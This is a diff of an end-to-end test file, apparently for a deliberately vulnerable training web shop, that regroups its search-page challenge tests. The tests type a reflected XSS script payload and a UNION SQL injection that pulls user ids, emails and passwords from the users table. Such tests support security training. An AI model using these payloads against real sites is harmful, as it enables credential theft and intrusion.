@@ -30,29 +30,37 @@ describe('search', function () {
         expect(productDescriptions.first().getText()).toMatch(/hand-picked/);
     });
 
-    it('search query should be susceptible to reflected XSS attacks', function () {
-        element(by.model('searchQuery')).sendKeys('<script>alert("XSS1")</script>');
+    describe('challenge xss1', function () {
 
-        element(by.id('searchButton')).click();
+        it('search query should be susceptible to reflected XSS attacks', function () {
+            element(by.model('searchQuery')).sendKeys('<script>alert("XSS1")</script>');
 
-        browser.switchTo().alert().then(function (alert) {
-            expect(alert.getText()).toEqual('XSS1');
-            alert.accept();
+            element(by.id('searchButton')).click();
+
+            browser.switchTo().alert().then(function (alert) {
+                expect(alert.getText()).toEqual('XSS1');
+                alert.accept();
+            });
+
         });
 
+        protractor.expect.challengeSolved({challenge: 'xss1'});
+
     });
 
-    protractor.expect.challengeSolved({challenge: 'xss1'});
+    describe('challenge unionSqlI', function () {
 
-    it('search query should be susceptible to UNION SQL injection attacks', function () {
-        element(by.model('searchQuery')).sendKeys('\') union select null,id,email,password,null,null,null from users--');
+        it('search query should be susceptible to UNION SQL injection attacks', function () {
+            element(by.model('searchQuery')).sendKeys('\') union select null,id,email,password,null,null,null from users--');
 
-        element(by.id('searchButton')).click();
+            element(by.id('searchButton')).click();
 
-        var productDescriptions = element.all(by.repeater('product in products').column('description'));
-        expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
+            var productDescriptions = element.all(by.repeater('product in products').column('description'));
+            expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
+        });
+
+        protractor.expect.challengeSolved({challenge: 'unionSqlI'});
+
     });
-
-    protractor.expect.challengeSolved({challenge: 'unionSqlI'});
 
 });
